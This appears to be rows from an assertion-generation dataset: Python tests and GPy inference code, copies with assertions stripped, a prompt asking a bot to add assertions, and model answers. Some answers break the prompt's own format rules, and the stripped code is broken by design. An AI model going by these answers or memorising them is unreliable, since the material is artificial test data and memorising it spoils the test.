    def test_chmod_rw_rwr(self):
        self.init(""rw----"", ""rwr---"")
        self.addData()
        self.chmod(self.owner)
        self.assertChmod()
        self.assertState(self.owner, True, True)

        self.refresh(self.member)
        self.assertState(self.member, False, False)


class TestChmodHard(BaseChmodTest):

    """"""
    Tests all the transitions which require runtime checks.
    These mostly center around *removing* read permissions
    since there it must be shown that this won't lead to
    confusing SecurityViolations.
    """"""

    pass
    # What to do about non-group chmod
","
1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4#
5# Copyright (C) 2012-2015 Glencoe Software, Inc. All Rights Reserved.
6# Use is subject to license terms supplied in LICENSE.txt
7#
8# This program is free software; you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation; either version 2 of the License, or
11# (at your option) any later version.
12#
13# This program is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License along
19# with this program; if not, write to the Free Software Foundation, Inc.,
20# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
21
22""""""
23   Tests of the changing permissions on groups
24
25""""""
26
27import time
28from omero.testlib import ITest
29import omero
30
31
32class BaseChmodTest(ITest):
33
34    """"""
35    """"""
36
37    def init(self, from_perms, to_perms):
38        self.group = self.new_group(perms=from_perms)
39        self.owner = self.new_client(group=self.group, owner=True)
40        self.member = self.new_client(group=self.group, owner=False)
41        self.from_perms = from_perms
42        self.to_perms = to_perms
43
44    def refresh(self, client):
45        client.sf.getAdminService().getEventContext()  # Refresh
46
47
48    def addData(self):
49        c = omero.model.CommentAnnotationI()
50        up = self.owner.sf.getUpdateService()
51        self.comment = up.saveAndReturnObject(c)
52
53    def load(self, client):
54        query = client.sf.getQueryService()
55        return query.get(""CommentAnnotation"", self.comment.id.val)
56
57    def chmod(self, client):
58        self.start = time.time()
59        try:
60            admin = client.sf.getAdminService()
61            old_ctx = admin.getEventContext()
62            old_grp = admin.getGroup(self.group.id.val)
63            self.change_permissions(self.group.id.val, self.to_perms, client)
64            new_ctx = admin.getEventContext()  # Refresh
65            new_grp = admin.getGroup(self.group.id.val)
66        finally:
67            self.stop = time.time()
68            self.elapsed = (self.stop - self.start)
69
70        # Check old
71        old_perms = old_grp.details.permissions
72
73        # Check new
74        new_perms = new_grp.details.permissions
75
76        old_comment = self.comment
77        new_comment = self.load(self.owner)
78        old_obj_perms = old_comment.details.permissions
79        new_obj_perms = new_comment.details.permissions
80
81
82        obj = self.load(client)
83        details = obj.details
84        perms = details.permissions
85
86        # Check the new perms state
87
88
89class TestChmodEasy(BaseChmodTest):
90
91    """"""
92    Tests all the transitions which are known to be trivial.
93    These mostly center around *adding* read permissions
94    since there is nothing new to check.
95    """"""
96
97
98    def test_chmod_rw_rwr(self):
99        self.init(""rw----"", ""rwr---"")
100        self.addData()
101        self.chmod(self.owner)
102
103        self.refresh(self.member)
104
105
106class TestChmodHard(BaseChmodTest):
107
108    """"""
109    Tests all the transitions which require runtime checks.
110    These mostly center around *removing* read permissions
111    since there it must be shown that this won't lead to
112    confusing SecurityViolations.
113    """"""
114
115    pass
116    # What to do about non-group chmod
117","[['str(a)', '==', 'str(b)'], ['canAnnotate', '==', 'perms.canAnnotate()'], ['canEdit', '==', 'perms.canEdit()'], ['details.getCallContext()', '==', 'not None'], ['details.getEventContext()', '==', 'not None'], ['self.elapsed', '<', '0.5']]",22,6,0.2727272727272727,0.0013297872340425,"['from_perms', 'to_perms', 'self.group', 'self.owner', 'self.member', 'self.from_perms', 'self.to_perms', 'client', 'a', 'b', 'c', 'up', 'self.comment', 'query', 'self.start', 'admin', 'old_ctx', 'old_grp', 'new_ctx', 'new_grp', 'self.stop', 'self.elapsed', 'old_perms', 'new_perms', 'old_comment', 'new_comment', 'old_obj_perms', 'new_obj_perms', 'canAnnotate', 'canEdit', 'obj', 'details', 'perms']",33,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['from_perms', 'to_perms', 'self.group', 'self.owner', 'self.member', 'self.from_perms', 'self.to_perms', 'client', 'a', 'b', 'c', 'up', 'self.comment', 'query', 'self.start', 'admin', 'old_ctx', 'old_grp', 'new_ctx', 'new_grp', 'self.stop', 'self.elapsed', 'old_perms', 'new_perms', 'old_comment', 'new_comment', 'old_obj_perms', 'new_obj_perms', 'canAnnotate', 'canEdit', 'obj', 'details', 'perms']
*Code:

1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4#
5# Copyright (C) 2012-2015 Glencoe Software, Inc. All Rights Reserved.
6# Use is subject to license terms supplied in LICENSE.txt
7#
8# This program is free software; you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation; either version 2 of the License, or
11# (at your option) any later version.
12#
13# This program is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License along
19# with this program; if not, write to the Free Software Foundation, Inc.,
20# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
21
22""""""
23   Tests of the changing permissions on groups
24
25""""""
26
27import time
28from omero.testlib import ITest
29import omero
30
31
32class BaseChmodTest(ITest):
33
34    """"""
35    """"""
36
37    def init(self, from_perms, to_perms):
38        self.group = self.new_group(perms=from_perms)
39        self.owner = self.new_client(group=self.group, owner=True)
40        self.member = self.new_client(group=self.group, owner=False)
41        self.from_perms = from_perms
42        self.to_perms = to_perms
43
44    def refresh(self, client):
45        client.sf.getAdminService().getEventContext()  # Refresh
46
47
48    def addData(self):
49        c = omero.model.CommentAnnotationI()
50        up = self.owner.sf.getUpdateService()
51        self.comment = up.saveAndReturnObject(c)
52
53    def load(self, client):
54        query = client.sf.getQueryService()
55        return query.get(""CommentAnnotation"", self.comment.id.val)
56
57    def chmod(self, client):
58        self.start = time.time()
59        try:
60            admin = client.sf.getAdminService()
61            old_ctx = admin.getEventContext()
62            old_grp = admin.getGroup(self.group.id.val)
63            self.change_permissions(self.group.id.val, self.to_perms, client)
64            new_ctx = admin.getEventContext()  # Refresh
65            new_grp = admin.getGroup(self.group.id.val)
66        finally:
67            self.stop = time.time()
68            self.elapsed = (self.stop - self.start)
69
70        # Check old
71        old_perms = old_grp.details.permissions
72
73        # Check new
74        new_perms = new_grp.details.permissions
75
76        old_comment = self.comment
77        new_comment = self.load(self.owner)
78        old_obj_perms = old_comment.details.permissions
79        new_obj_perms = new_comment.details.permissions
80
81
82        obj = self.load(client)
83        details = obj.details
84        perms = details.permissions
85
86        # Check the new perms state
87
88
89class TestChmodEasy(BaseChmodTest):
90
91    """"""
92    Tests all the transitions which are known to be trivial.
93    These mostly center around *adding* read permissions
94    since there is nothing new to check.
95    """"""
96
97
98    def test_chmod_rw_rwr(self):
99        self.init(""rw----"", ""rwr---"")
100        self.addData()
101        self.chmod(self.owner)
102
103        self.refresh(self.member)
104
105
106class TestChmodHard(BaseChmodTest):
107
108    """"""
109    Tests all the transitions which require runtime checks.
110    These mostly center around *removing* read permissions
111    since there it must be shown that this won't lead to
112    confusing SecurityViolations.
113    """"""
114
115    pass
116    # What to do about non-group chmod
117",5453,"[[37, 'from_perms', '!=', None, ""from_perms should not be None before initialization""], 
[37, 'to_perms', '!=', None, ""to_perms should not be None before initialization""], 
[39, 'self.group', '!=', None, ""self.group should be initialized""], 
[40, 'self.owner', '!=', None, ""self.owner should be initialized""],
[41, 'self.member', '!=', None, ""self.member should be initialized""],
[44, 'client', '!=', None, ""client should not be None before use""],
[53, 'client', '!=', None, ""client should not be None before use""],
[54, 'query', '!=', None, ""query should not be None after initialization""],
[57, 'client', '!=', None, ""client should not be None before use""],
[66, 'new_ctx', '!=', None, ""new_ctx should not be None after initialization""],
[66, 'new_grp', '!=', None, ""new_grp should not be None after initialization""],
[68, 'self.stop', '!=', None, ""self.stop should be initialized""],
[68, 'self.elapsed', '>=', 0, ""self.elapsed should be positive""],
[72, 'old_perms', '!=', None, ""old_perms should not be None""],
[74, 'new_perms', '!=', None, ""new_perms should not be None""],
[77, 'old_comment', '!=', None, ""old_comment should not be None""],
[77, 'new_comment', '!=', None, ""new_comment should not be None""],
[78, 'old_obj_perms', '!=', None, ""old_obj_perms should not be None""],
[79, 'new_obj_perms', '!=', None, ""new_obj_perms should not be None""],
[82, 'obj', '!=', None, ""obj should not be None after load""],
[83, 'details', '!=', None, ""details should not be None""],
[84, 'perms', '!=', None, ""perms should not be None after initialization""],
[101, 'self.owner', '!=', None, ""self.owner should not be None before use""],
[103, 'self.member', '!=', None, ""self.member should not be None before use""]]"
Aeron/thefuck,"import pytest
from pathlib import PosixPath, Path
from mock import Mock
from thefuck import corrector, conf, types
from tests.utils import Rule, Command, CorrectedCommand
from thefuck.corrector import make_corrected_commands, get_corrected_commands, remove_duplicates


def test_load_rule(mocker):
    match = object()
    get_new_command = object()
    load_source = mocker.patch(
        'thefuck.corrector.load_source',
        return_value=Mock(match=match,
                          get_new_command=get_new_command,
                          enabled_by_default=True,
                          priority=900,
                          requires_output=True))
    assert corrector.load_rule(Path('/rules/bash.py'), settings=Mock(priority={})) \
           == Rule('bash', match, get_new_command, priority=900)
    load_source.assert_called_once_with('bash', '/rules/bash.py')


class TestGetRules(object):
    @pytest.fixture(autouse=True)
    def glob(self, mocker):
        return mocker.patch('thefuck.corrector.Path.glob', return_value=[])

    def _compare_names(self, rules, names):
        return [r.name for r in rules] == names

    @pytest.mark.parametrize('conf_rules, rules', [
        (conf.DEFAULT_RULES, ['bash', 'lisp', 'bash', 'lisp']),
        (types.RulesNamesList(['bash']), ['bash', 'bash'])])
    def test_get(self, monkeypatch, glob, conf_rules, rules):
        glob.return_value = [PosixPath('bash.py'), PosixPath('lisp.py')]
        monkeypatch.setattr('thefuck.corrector.load_source',
                            lambda x, _: Rule(x))
        assert self._compare_names(
            corrector.get_rules(Path('~'), Mock(rules=conf_rules, priority={})),
            rules)


class TestGetMatchedRules(object):
    def test_no_match(self):
        assert list(corrector.get_matched_rules(
            Command('ls'), [Rule('', lambda *_: False)],
            Mock(no_colors=True))) == []

    def test_match(self):
        rule = Rule('', lambda x, _: x.script == 'cd ..')
        assert list(corrector.get_matched_rules(
            Command('cd ..'), [rule], Mock(no_colors=True))) == [rule]

    def test_when_rule_failed(self, capsys):
        all(corrector.get_matched_rules(
            Command('ls'), [Rule('test', Mock(side_effect=OSError('Denied')),
                                 requires_output=False)],
            Mock(no_colors=True, debug=False)))
        assert capsys.readouterr()[1].split('\n')[0] == '[WARN] Rule test:'


class TestGetCorrectedCommands(object):
    def test_with_rule_returns_list(self):
        rule = Rule(get_new_command=lambda x, _: [x.script + '!', x.script + '@'],
                    priority=100)
        assert list(make_corrected_commands(Command(script='test'), [rule], None)) \
               == [CorrectedCommand(script='test!', priority=100),
                   CorrectedCommand(script='test@', priority=200)]

    def test_with_rule_returns_command(self):
        rule = Rule(get_new_command=lambda x, _: x.script + '!',
                    priority=100)
        assert list(make_corrected_commands(Command(script='test'), [rule], None)) \
               == [CorrectedCommand(script='test!', priority=100)]


def test_remove_duplicates():
    side_effect = lambda *_: None
    assert set(remove_duplicates([CorrectedCommand('ls', priority=100),
                                  CorrectedCommand('ls', priority=200),
                                  CorrectedCommand('ls', side_effect, 300)])) \
           == {CorrectedCommand('ls', priority=100),
               CorrectedCommand('ls', side_effect, 300)}


def test_get_corrected_commands(mocker):
    command = Command('test', 'test', 'test')
    rules = [Rule(match=lambda *_: False),
             Rule(match=lambda *_: True,
                  get_new_command=lambda x, _: x.script + '!', priority=100),
             Rule(match=lambda *_: True,
                  get_new_command=lambda x, _: [x.script + '@', x.script + ';'],
                  priority=60)]
    mocker.patch('thefuck.corrector.get_rules', return_value=rules)
    assert [cmd.script for cmd in get_corrected_commands(command, None, Mock(debug=False))] \
           == ['test@', 'test!', 'test;']
","
1import pytest
2from pathlib import PosixPath, Path
3from mock import Mock
4from thefuck import corrector, conf, types
5from tests.utils import Rule, Command, CorrectedCommand
6from thefuck.corrector import make_corrected_commands, get_corrected_commands, remove_duplicates
7
8
9def test_load_rule(mocker):
10    match = object()
11    get_new_command = object()
12    load_source = mocker.patch(
13        'thefuck.corrector.load_source',
14        return_value=Mock(match=match,
15                          get_new_command=get_new_command,
16                          enabled_by_default=True,
17                          priority=900,
18                          requires_output=True))
19           == Rule('bash', match, get_new_command, priority=900)
20
21
22class TestGetRules(object):
23    @pytest.fixture(autouse=True)
24    def glob(self, mocker):
25        return mocker.patch('thefuck.corrector.Path.glob', return_value=[])
26
27    def _compare_names(self, rules, names):
28        return [r.name for r in rules] == names
29
30    @pytest.mark.parametrize('conf_rules, rules', [
31        (conf.DEFAULT_RULES, ['bash', 'lisp', 'bash', 'lisp']),
32        (types.RulesNamesList(['bash']), ['bash', 'bash'])])
33    def test_get(self, monkeypatch, glob, conf_rules, rules):
34        glob.return_value = [PosixPath('bash.py'), PosixPath('lisp.py')]
35        monkeypatch.setattr('thefuck.corrector.load_source',
36                            lambda x, _: Rule(x))
37            corrector.get_rules(Path('~'), Mock(rules=conf_rules, priority={})),
38            rules)
39
40
41class TestGetMatchedRules(object):
42    def test_no_match(self):
43            Command('ls'), [Rule('', lambda *_: False)],
44            Mock(no_colors=True))) == []
45
46    def test_match(self):
47        rule = Rule('', lambda x, _: x.script == 'cd ..')
48            Command('cd ..'), [rule], Mock(no_colors=True))) == [rule]
49
50    def test_when_rule_failed(self, capsys):
51        all(corrector.get_matched_rules(
52            Command('ls'), [Rule('test', Mock(side_effect=OSError('Denied')),
53                                 requires_output=False)],
54            Mock(no_colors=True, debug=False)))
55
56
57class TestGetCorrectedCommands(object):
58    def test_with_rule_returns_list(self):
59        rule = Rule(get_new_command=lambda x, _: [x.script + '!', x.script + '@'],
60                    priority=100)
61               == [CorrectedCommand(script='test!', priority=100),
62                   CorrectedCommand(script='test@', priority=200)]
63
64    def test_with_rule_returns_command(self):
65        rule = Rule(get_new_command=lambda x, _: x.script + '!',
66                    priority=100)
67               == [CorrectedCommand(script='test!', priority=100)]
68
69
70def test_remove_duplicates():
71    side_effect = lambda *_: None
72                                  CorrectedCommand('ls', priority=200),
73                                  CorrectedCommand('ls', side_effect, 300)])) \
74           == {CorrectedCommand('ls', priority=100),
75               CorrectedCommand('ls', side_effect, 300)}
76
77
78def test_get_corrected_commands(mocker):
79    command = Command('test', 'test', 'test')
80    rules = [Rule(match=lambda *_: False),
81             Rule(match=lambda *_: True,
82                  get_new_command=lambda x, _: x.script + '!', priority=100),
83             Rule(match=lambda *_: True,
84                  get_new_command=lambda x, _: [x.script + '@', x.script + ';'],
85                  priority=60)]
86    mocker.patch('thefuck.corrector.get_rules', return_value=rules)
87           == ['test@', 'test!', 'test;']
88","[[""corrector.load_rule(Path('/rules/bash.py')"", '==', 'True'], ['self._compare_names(', '==', 'True'], ['list(corrector.get_matched_rules(', '==', 'True'], ['list(corrector.get_matched_rules(', '==', 'True'], [""capsys.readouterr()[1].split('\\n')[0]"", '==', ""'[WARN] Rule test:'""], ['list(make_corrected_comm', '==', 'True'], ['s(Comm', '==', 'True'], [""(script='test')"", '==', 'True'], ['list(make_corrected_comm', '==', 'True'], ['s(Comm', '==', 'True'], [""(script='test')"", '==', 'True'], ['set(remove_duplicates([CorrectedComm', '==', 'True'], [""('ls'"", '==', 'True']]",10,13,1.3,0.0031018849916487,"['mocker', 'match', 'get_new_command', 'load_source', 'rules', 'names', 'monkeypatch', 'glob', 'conf_rules', 'glob.return_value', 'rule', 'capsys', 'side_effect', 'command']",14,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['mocker', 'match', 'get_new_command', 'load_source', 'rules', 'names', 'monkeypatch', 'glob', 'conf_rules', 'glob.return_value', 'rule', 'capsys', 'side_effect', 'command']
*Code:

1import pytest
2from pathlib import PosixPath, Path
3from mock import Mock
4from thefuck import corrector, conf, types
5from tests.utils import Rule, Command, CorrectedCommand
6from thefuck.corrector import make_corrected_commands, get_corrected_commands, remove_duplicates
7
8
9def test_load_rule(mocker):
10    match = object()
11    get_new_command = object()
12    load_source = mocker.patch(
13        'thefuck.corrector.load_source',
14        return_value=Mock(match=match,
15                          get_new_command=get_new_command,
16                          enabled_by_default=True,
17                          priority=900,
18                          requires_output=True))
19           == Rule('bash', match, get_new_command, priority=900)
20
21
22class TestGetRules(object):
23    @pytest.fixture(autouse=True)
24    def glob(self, mocker):
25        return mocker.patch('thefuck.corrector.Path.glob', return_value=[])
26
27    def _compare_names(self, rules, names):
28        return [r.name for r in rules] == names
29
30    @pytest.mark.parametrize('conf_rules, rules', [
31        (conf.DEFAULT_RULES, ['bash', 'lisp', 'bash', 'lisp']),
32        (types.RulesNamesList(['bash']), ['bash', 'bash'])])
33    def test_get(self, monkeypatch, glob, conf_rules, rules):
34        glob.return_value = [PosixPath('bash.py'), PosixPath('lisp.py')]
35        monkeypatch.setattr('thefuck.corrector.load_source',
36                            lambda x, _: Rule(x))
37            corrector.get_rules(Path('~'), Mock(rules=conf_rules, priority={})),
38            rules)
39
40
41class TestGetMatchedRules(object):
42    def test_no_match(self):
43            Command('ls'), [Rule('', lambda *_: False)],
44            Mock(no_colors=True))) == []
45
46    def test_match(self):
47        rule = Rule('', lambda x, _: x.script == 'cd ..')
48            Command('cd ..'), [rule], Mock(no_colors=True))) == [rule]
49
50    def test_when_rule_failed(self, capsys):
51        all(corrector.get_matched_rules(
52            Command('ls'), [Rule('test', Mock(side_effect=OSError('Denied')),
53                                 requires_output=False)],
54            Mock(no_colors=True, debug=False)))
55
56
57class TestGetCorrectedCommands(object):
58    def test_with_rule_returns_list(self):
59        rule = Rule(get_new_command=lambda x, _: [x.script + '!', x.script + '@'],
60                    priority=100)
61               == [CorrectedCommand(script='test!', priority=100),
62                   CorrectedCommand(script='test@', priority=200)]
63
64    def test_with_rule_returns_command(self):
65        rule = Rule(get_new_command=lambda x, _: x.script + '!',
66                    priority=100)
67               == [CorrectedCommand(script='test!', priority=100)]
68
69
70def test_remove_duplicates():
71    side_effect = lambda *_: None
72                                  CorrectedCommand('ls', priority=200),
73                                  CorrectedCommand('ls', side_effect, 300)])) \
74           == {CorrectedCommand('ls', priority=100),
75               CorrectedCommand('ls', side_effect, 300)}
76
77
78def test_get_corrected_commands(mocker):
79    command = Command('test', 'test', 'test')
80    rules = [Rule(match=lambda *_: False),
81             Rule(match=lambda *_: True,
82                  get_new_command=lambda x, _: x.script + '!', priority=100),
83             Rule(match=lambda *_: True,
84                  get_new_command=lambda x, _: [x.script + '@', x.script + ';'],
85                  priority=60)]
86    mocker.patch('thefuck.corrector.get_rules', return_value=rules)
87           == ['test@', 'test!', 'test;']
88",5215,"[
[9, 'mocker', '!=', None, ""mocker cannot be None as it is expected to stub functions""],
[11, 'match', '!=', None, ""match cannot be None as it serves as a mock object""],
[11, 'get_new_command', '!=', None, ""get_new_command cannot be None as it serves as a mock object""],
[17, 'load_source', '!=', None, ""load_source cannot be None after getting patched by mocker""],
[33, 'glob', '!=', None, ""glob cannot be None as it needs to evaluate file paths""],
[33, 'conf_rules', '!=', None, ""conf_rules cannot be None as it holds rule configurations""],
[33, 'rules', '!=', None, ""rules cannot be None as they holds the list of rules""],
[43, 'Command', '!=', None, ""Command object must not be None""],
[47, 'rule', '!=', None, ""rule object must not be None""],
[51, 'capsys', '!=', None, ""capsys should not be None for error capture""],
[59, 'rule', '!=', None, ""rule object must not be None""],
[65, 'rule', '!=', None, ""rule object must not be None""],
[71, 'side_effect', '!=', None, ""side_effect function must not be None""],
[79, 'command', '!=', None, ""command object must not be None""],
[80, 'rules', '!=', None, ""rules object must not be None""]
]"
wfxiang08/changes,"from datetime import datetime
from uuid import UUID

from changes.api.serializer import serialize
from changes.models import LogSource, Job, JobStep


def test_simple():
    logsource = LogSource(
        id=UUID(hex='33846695b2774b29a71795a009e8168a'),
        job_id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6'),
        job=Job(id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6')),
        step=JobStep(
            id=UUID(hex='36c7af5e56aa4a7fbf076e13ac00a866'),
            phase_id=UUID(hex='46c7af5e56aa4a7fbf076e13ac00a866')
        ),
        name='console',
        date_created=datetime(2013, 9, 19, 22, 15, 22),
    )
    result = serialize(logsource)
    assert result['id'] == '33846695b2774b29a71795a009e8168a'
    assert result['name'] == 'console'
    assert result['dateCreated'] == '2013-09-19T22:15:22'
    assert result['step']['id'] == '36c7af5e56aa4a7fbf076e13ac00a866'
","
1from datetime import datetime
2from uuid import UUID
3
4from changes.api.serializer import serialize
5from changes.models import LogSource, Job, JobStep
6
7
8def test_simple():
9    logsource = LogSource(
10        id=UUID(hex='33846695b2774b29a71795a009e8168a'),
11        job_id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6'),
12        job=Job(id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6')),
13        step=JobStep(
14            id=UUID(hex='36c7af5e56aa4a7fbf076e13ac00a866'),
15            phase_id=UUID(hex='46c7af5e56aa4a7fbf076e13ac00a866')
16        ),
17        name='console',
18        date_created=datetime(2013, 9, 19, 22, 15, 22),
19    )
20    result = serialize(logsource)
21","[[""result['id']"", '==', ""'33846695b2774b29a71795a009e8168a'""], [""result['name']"", '==', ""'console'""], [""result['dateCreated']"", '==', ""'2013-09-19T22:15:22'""], [""result['step']['id']"", '==', ""'36c7af5e56aa4a7fbf076e13ac00a866'""]]",4,4,1.0,0.0044943820224719,"['logsource', 'result']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['logsource', 'result']
*Code:

1from datetime import datetime
2from uuid import UUID
3
4from changes.api.serializer import serialize
5from changes.models import LogSource, Job, JobStep
6
7
8def test_simple():
9    logsource = LogSource(
10        id=UUID(hex='33846695b2774b29a71795a009e8168a'),
11        job_id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6'),
12        job=Job(id=UUID(hex='2e18a7cbc0c24316b2ef9d41fea191d6')),
13        step=JobStep(
14            id=UUID(hex='36c7af5e56aa4a7fbf076e13ac00a866'),
15            phase_id=UUID(hex='46c7af5e56aa4a7fbf076e13ac00a866')
16        ),
17        name='console',
18        date_created=datetime(2013, 9, 19, 22, 15, 22),
19    )
20    result = serialize(logsource)
21",2098,"[8, 'logsource', '!=', None, 'logsource should be initialized before serialization'],
[20, 'result', '!=', None, 'Serialization of logsource should not return None']"
strongh/GPy,"# Copyright (c) 2012-2014, James Hensman
# Licensed under the BSD 3-clause license (see LICENSE.txt)

from posterior import Posterior
from ...util.linalg import jitchol, tdot, dtrtrs, dpotri, pdinv
import numpy as np
from . import LatentFunctionInference
log_2_pi = np.log(2*np.pi)

class DTC(LatentFunctionInference):
    """"""
    An object for inference when the likelihood is Gaussian, but we want to do sparse inference.

    The function self.inference returns a Posterior object, which summarizes
    the posterior.

    NB. It's not recommended to use this function! It's here for historical purposes. 

    """"""
    def __init__(self):
        self.const_jitter = 1e-6

    def inference(self, kern, X, Z, likelihood, Y, Y_metadata=None):
        assert X_variance is None, ""cannot use X_variance with DTC. Try varDTC.""

        num_inducing, _ = Z.shape
        num_data, output_dim = Y.shape

        #make sure the noise is not hetero
        beta = 1./likelihood.gaussian_variance(Y_metadata)
        if beta.size > 1:
            raise NotImplementedError, ""no hetero noise with this implementation of DTC""

        Kmm = kern.K(Z)
        Knn = kern.Kdiag(X)
        Knm = kern.K(X, Z)
        U = Knm
        Uy = np.dot(U.T,Y)

        #factor Kmm
        Kmmi, L, Li, _ = pdinv(Kmm)

        # Compute A
        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
        A = tdot(LiUTbeta) + np.eye(num_inducing)

        # factor A
        LA = jitchol(A)

        # back substutue to get b, P, v
        tmp, _ = dtrtrs(L, Uy, lower=1)
        b, _ = dtrtrs(LA, tmp*beta, lower=1)
        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
        P = tdot(tmp.T)

        #compute log marginal
        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
                       -np.sum(np.log(np.diag(LA)))*output_dim + \
                       0.5*num_data*output_dim*np.log(beta) + \
                       -0.5*beta*np.sum(np.square(Y)) + \
                       0.5*np.sum(np.square(b))

        # Compute dL_dKmm
        vvT_P = tdot(v.reshape(-1,1)) + P
        dL_dK = 0.5*(Kmmi - vvT_P)

        # Compute dL_dU
        vY = np.dot(v.reshape(-1,1),Y.T)
        dL_dU = vY - np.dot(vvT_P, U.T)
        dL_dU *= beta

        #compute dL_dR
        Uv = np.dot(U, v)
        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1))*beta**2

        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)

        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn), 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}

        #construct a posterior object
        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)

        return post, log_marginal, grad_dict

class vDTC(object):
    def __init__(self):
        self.const_jitter = 1e-6

    def inference(self, kern, X, X_variance, Z, likelihood, Y, Y_metadata):
        assert X_variance is None, ""cannot use X_variance with DTC. Try varDTC.""

        num_inducing, _ = Z.shape
        num_data, output_dim = Y.shape

        #make sure the noise is not hetero
        beta = 1./likelihood.gaussian_variance(Y_metadata)
        if beta.size > 1:
            raise NotImplementedError, ""no hetero noise with this implementation of DTC""

        Kmm = kern.K(Z)
        Knn = kern.Kdiag(X)
        Knm = kern.K(X, Z)
        U = Knm
        Uy = np.dot(U.T,Y)

        #factor Kmm
        Kmmi, L, Li, _ = pdinv(Kmm)

        # Compute A
        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
        A_ = tdot(LiUTbeta)
        trace_term = -0.5*(np.sum(Knn)*beta - np.trace(A_))
        A = A_ + np.eye(num_inducing)

        # factor A
        LA = jitchol(A)

        # back substutue to get b, P, v
        tmp, _ = dtrtrs(L, Uy, lower=1)
        b, _ = dtrtrs(LA, tmp*beta, lower=1)
        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
        P = tdot(tmp.T)
        stop

        #compute log marginal
        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
                       -np.sum(np.log(np.diag(LA)))*output_dim + \
                       0.5*num_data*output_dim*np.log(beta) + \
                       -0.5*beta*np.sum(np.square(Y)) + \
